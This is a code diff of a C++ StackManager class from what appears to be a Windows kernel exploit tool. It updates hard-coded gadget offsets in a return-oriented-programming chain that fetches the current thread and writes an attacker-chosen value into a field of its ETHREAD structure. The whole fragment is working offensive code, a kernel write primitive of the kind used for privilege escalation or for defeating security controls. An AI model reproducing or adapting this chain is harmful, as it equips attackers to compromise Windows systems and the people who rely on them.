@@ -34,12 +34,12 @@ void StackManager::AddPadding(const std::size_t PaddingSize)
 void StackManager::ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue)
 {
 	this->AddFunctionCall("PsGetCurrentThread");
-	this->AddGadget(0x256c4a, "pop rcx; ret;"); // pop rcx; ret;
+	this->AddGadget(0x24cd7b, "pop rcx; ret;"); // pop rcx; ret;
 	this->AddValue(FieldOffset, "ETHREAD offset"); // Offset inside of ETHREAD we want to write to
-	this->AddGadget(0x28efa4, "add rax, rcx; ret;"); // add rax, rcx; ret;
-	this->AddGadget(0x2f7921, "pop r8; ret;"); // pop r8; ret;
+	this->AddGadget(0x263f08, "add rax, rcx; ret;"); // add rax, rcx; ret;
+	this->AddGadget(0x47f82d, "pop r8; ret;"); // pop r8; ret;
 	this->AddValue(NewValue, "New field value"); // New value we write to the field
-	this->AddGadget(0x3c3a81, "mov qword ptr [rax], r8; ret;"); // mov qword ptr [rax], r8; ret;
+	this->AddGadget(0x2bc741, "mov qword ptr [rax], r8; ret;"); // mov qword ptr [rax], r8; ret;
 }
 
 void StackManager::ModifyThreadStartAddress(const std::uint64_t NewStartAddress)
